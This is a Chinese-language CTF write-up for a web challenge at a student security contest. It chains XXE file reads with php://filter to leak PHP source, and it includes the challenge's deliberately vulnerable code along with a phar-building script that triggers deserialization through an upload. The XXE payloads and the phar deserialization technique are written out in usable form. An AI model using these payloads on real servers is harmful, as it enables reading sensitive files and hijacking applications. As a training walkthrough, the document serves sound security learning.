# 你读懂潇文清的网站了吗xxe
## 考察知识点
### 1.xxe
### 2.pahr协议序列化攻击


### 1.首先题目提示xxe，构造xxe
```
<?xml version = "1.0"?>
<!DOCTYPE note [<!ENTITY hacker SYSTEM "file://etc/passwd"> ]>
<name>&hacker;</name>
```

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/EC4F0B61A5404B41A62FBDE825439E6E你读懂萧文清的网站了吗1.png)

可能是返回文件中的的特殊符号（例如<),无法被xml解析

尝试为协议：

```
<?xml version = "1.0"?>
<!DOCTYPE note [<!ENTITY hacker SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php"> ]>
<name>&hacker;</name>
```

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/5A9797FA043C45CDA3C429CE001553C0你读懂萧文清的网站了吗2.png)

### 2.解码之后得到index.php文件内容：

```
<?php
error_reporting(0);
include("./config.php");
date_default_timezone_set("PRC");

if(!empty($_POST['submit'])){
    $data= $_POST['data'];

//    不能直接读取flag文件，甚至还把为协议禁了
    if (preg_match("/flag|decode|file|zlib|input|data|http|ftp|#/i",$data)){
        echo "no!!!you cant read flag right here!";
        exit();
    }

//    导致xxe
    $xml = simplexml_load_string($data,'SimpleXMLElement',LIBXML_NOENT);

    print($xml);
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Login</title>
    <link href="./style_log.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="./style.css">
    <link rel="stylesheet" type="text/css" href="./userpanel.css">

</head>

<body class="login" mycollectionplug="bind">
<div class="login_m">
    <div class="login_logo"><img src="http://120.79.186.183/jpg/677406.jpg" width="216" height="130"></div>
    <div class="login_boder">
        <div class="login_padding" id="login_model">
            <div style="text-align:center; vertical-align:middel;">
                <h3>告诉我你想说的</h3>
            </div>
            <form action="./index.php" method="post" enctype="multipart/form-data" type="code" name="code" id="code" class="txt_input" onfocus="if (value ==&#39;******&#39;){value =&#39;&#39;}" onblur="if (value ==&#39;&#39;){value=&#39;******&#39;}">
                <div style="text-align:center; vertical-align:middel;">
<textarea type="text" id='divcss5' name="data">
</textarea>

                </div>
                <br>
                <div style="text-align:center; vertical-align:middel;">
                    <input type="submit" class="sub_buttons" name="submit" id="Retrievenow" value="submit"
                           style="opacity: 0.7;">
                </div>
            </form>

            <br> <br>
            <br> <br>
            <br> <br>
            <br> <br>
            <br> <br>
            <br> <br>
            <p align="center"> Syclover - Ayrian</p>


</body>
</html>
```

继续读取config.php:

```
<?php
class File{
    public  $filetype;
    public  $filename;

//    现在唯一思路就是序列化执行
    public function __wakeup(){
        echo "wake up ";
        var_dump(readfile("php://filter/read=convert.base64-encode/resource=flag.php"));
    }

    public function check($filetype,$filename){
        $filename = $filename;
        $filetype = $filetype;

        if (($filetype!="image/jpg")&&(substr($filename, strrpos($filename, '.')+1))!= 'jpg') {
            echo "只允许上传jpg格式文件";
            exit();
        }

    }

    public function upload($filetemp){
        $target_file = getcwd()."/uploads/".md5($filetemp+$_SERVER['HTTP_REFERER']).".jpg";
        $handle = fopen($filetemp, "r");
        $content = '';
        while(!feof($handle)){
            $content .= fread($handle, 8080);
        }
        if (preg_match("/xml|#|SYSTEM|DOCTYPE|fliter|uploads|www/i",$content)){
            echo "Invalid file!!!!";
            exit();
        }
        fclose($handle);

        if (move_uploaded_file($filetemp, $target_file)) {
            echo "your file is here:".$target_file;
        }
    }

}
```

发现有文件上传，并且根据__walkup（）,可推测是序列化攻击。

访问upload.php文件发现存在upload.php文件：

```
<!DOCTYPE html>
<html>
<head>
    <title>Ayrain</title>
</head>
<body>
<h3>上传一个文件，让我康康你这是什么乱七八糟的东西。</h3>
<form action="./upload.php" method="post" enctype="multipart/form-data" type="code" name="code" id="code" class="txt_input" onfocus="if (value ==&#39;******&#39;){value =&#39;&#39;}" onblur="if (value ==&#39;&#39;){value=&#39;******&#39;}">
    <input type="file" name="file" />
    <input type="submit" name="Check" />
</form>

</body>
</html>

<?php
error_reporting(0);
include("config.php");
        $filename = $_FILES["file"]["name"];
        $filetype = $_FILES["file"]["type"];
        $filetemp = $_FILES["file"]["tmp_name"];

        $file = new File();
        $file->check($filetype,$filename);
        $file->upload($filetemp);
?>

```

### 3.代码中并没有发现unseialize()函数，但是根据目前的信息，已经有另一个思路，构造phar包，xxe触发序列化，触发__wakeup()函数读取flag.php文件

phar文件生成脚本：

```
<?php
class File{
    public function __wakeup(){
        echo "ctfla:";
    }
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new File();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

### 4.上传文件
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/61DCE294978D4778B1F8B70904DD569D你读懂萧文清的网站了吗3.png)

xxe触发序列化：

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/54EC0B7ED6B14A568120EAE1215DF136你读懂萧文清的网站了吗4.png)

解码即可得到flag：
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/第十届极客大赛（成信大）/images/497AC547586C49748158C37964CDFD45你读懂萧文清的网站了吗5.png)
